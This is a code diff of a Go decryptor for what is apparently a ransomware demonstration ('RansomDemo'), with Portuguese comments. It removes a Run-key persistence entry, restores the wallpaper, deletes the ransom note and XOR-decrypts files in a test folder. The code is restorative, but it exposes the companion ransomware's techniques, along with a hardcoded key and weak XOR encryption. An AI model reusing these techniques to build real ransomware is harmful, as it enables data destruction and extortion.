@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	"io/ioutil"
 	"os"
 	"path/filepath"
 	"strings"
@@ -10,11 +9,13 @@ import (
 	"unsafe"
 
 	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/registry"
 )
 
-const password = "123"
-
-// ======================= FUNÇÕES PRINCIPAIS =======================
+const (
+	password  = "123"
+	targetDir = `C:\teste`
+)
 
 func xorEncrypt(data []byte) []byte {
 	encrypted := make([]byte, len(data))
@@ -24,31 +25,35 @@ func xorEncrypt(data []byte) []byte {
 	return encrypted
 }
 
-func restoreOriginalWallpaper() {
-	targetDir := ""
-	data, err := ioutil.ReadFile(filepath.Join(targetDir, "original_wallpaper.txt"))
-	if err != nil {
-		return
-	}
-
-	originalPath := string(data)
+func restoreDefaultWallpaper() {
+	defaultWallpaper := `C:\Windows\Web\Wallpaper\Windows\img0.jpg`
 	user32 := windows.NewLazySystemDLL("user32.dll")
 	systemParameters := user32.NewProc("SystemParametersInfoW")
 
-	pathUTF16, _ := windows.UTF16PtrFromString(originalPath)
+	pathUTF16, _ := windows.UTF16PtrFromString(defaultWallpaper)
 	systemParameters.Call(
 		uintptr(0x0014), // SPI_SETDESKWALLPAPER
 		0,
 		uintptr(unsafe.Pointer(pathUTF16)),
 		uintptr(0x01|0x02), // SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
 	)
+}
 
-	os.Remove(filepath.Join(targetDir, "original_wallpaper.txt"))
+func removeFromStartup() {
+	key, err := registry.OpenKey(
+		registry.CURRENT_USER,
+		`Software\Microsoft\Windows\CurrentVersion\Run`,
+		registry.SET_VALUE,
+	)
+	if err != nil {
+		return
+	}
+	defer key.Close()
+	key.DeleteValue("RansomDemo")
 }
 
 func main() {
-	targetDir := `C:\teste`
-	fmt.Print("\033[36m") // Cor ciano
+	fmt.Print("\033[36m")
 	fmt.Println("[?] Insira a chave de descriptografia:")
 	fmt.Print("\033[0m")
 
@@ -66,12 +71,15 @@ func main() {
 		return
 	}
 
-	// Apagar arquivos de aviso
-	os.Remove(filepath.Join(targetDir, "!!!WARNING!!!.txt"))
-	os.Remove(filepath.Join(targetDir, "attack_log.txt"))
+	// Remover persistência
+	removeFromStartup()
 
-	// Restaurar wallpaper original
-	restoreOriginalWallpaper()
+	// Restaurar wallpaper padrão
+	restoreDefaultWallpaper()
+
+	// Apagar arquivos residuais
+	os.Remove(filepath.Join(targetDir, "!!!WARNING!!!.txt"))
+	os.Remove(filepath.Join(targetDir, "wallpaper.jpg")) // <--- NOVO!
 
 	// Descriptografar arquivos
 	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
@@ -79,17 +87,17 @@ func main() {
 			return nil
 		}
 
-		data, _ := ioutil.ReadFile(path)
+		data, _ := os.ReadFile(path)
 		decryptedData := xorEncrypt(data)
 
 		originalName := strings.TrimPrefix(strings.TrimSuffix(info.Name(), ".aeehh"), "[RANSOM]")
-		ioutil.WriteFile(filepath.Join(filepath.Dir(path), originalName), decryptedData, 0644)
+		os.WriteFile(filepath.Join(filepath.Dir(path), originalName), decryptedData, 0644)
 		os.Remove(path)
 
 		return nil
 	})
 
 	fmt.Print("\033[32m")
-	fmt.Println("[+] Arquivos restaurados com sucesso!")
+	fmt.Println("[+] Sistema restaurado com sucesso!")
 	fmt.Print("\033[0m")
 }
